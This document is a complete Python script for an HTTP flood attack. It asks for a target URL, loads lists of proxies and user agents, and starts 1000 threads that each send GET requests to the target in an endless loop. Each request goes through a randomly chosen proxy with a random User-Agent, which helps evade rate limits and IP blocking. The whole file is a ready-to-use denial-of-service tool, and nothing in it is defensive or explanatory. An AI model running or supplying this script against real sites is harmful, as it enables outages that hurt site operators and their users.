import requests
import threading
import random
import time

# Function to load proxies from external txt file
def load_proxies(filename):
    with open(filename, 'r') as file:
        proxies = file.read().splitlines()
    return proxies

# Function to load user agents from external txt file
def load_useragents(filename):
    with open(filename, 'r') as file:
        useragents = file.read().splitlines()
    return useragents

# Function to send requests using proxies and random user agents
def send_request(url, proxies, useragents):
    while True:
        try:
            proxy = random.choice(proxies)
            useragent = random.choice(useragents)
            headers = {'User-Agent': useragent}
            response = requests.get(url, proxies={'http': proxy, 'https': proxy}, headers=headers)
            print(f"Request sent! Proxy: {proxy}, User-Agent: {useragent}")
        except Exception as e:
            print(f"Error: {e}")

# Main function
def main():
    url = input('enter url: ')  # Replace with target URL
    proxy_file = 'proxy.txt'  # Replace with path to proxy file
    useragent_file = 'ua.txt'  # Replace with path to user agent file
    
    proxies = load_proxies(proxy_file)
    useragents = load_useragents(useragent_file)
    
    num_threads = 1000  # Adjust based on desired request rate
    threads = []
    
    for _ in range(num_threads):
        t = threading.Thread(target=send_request, args=(url, proxies, useragents))
        t.start()
        threads.append(t)
        time.sleep(0.01)  # Adjust to prevent overwhelming system
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
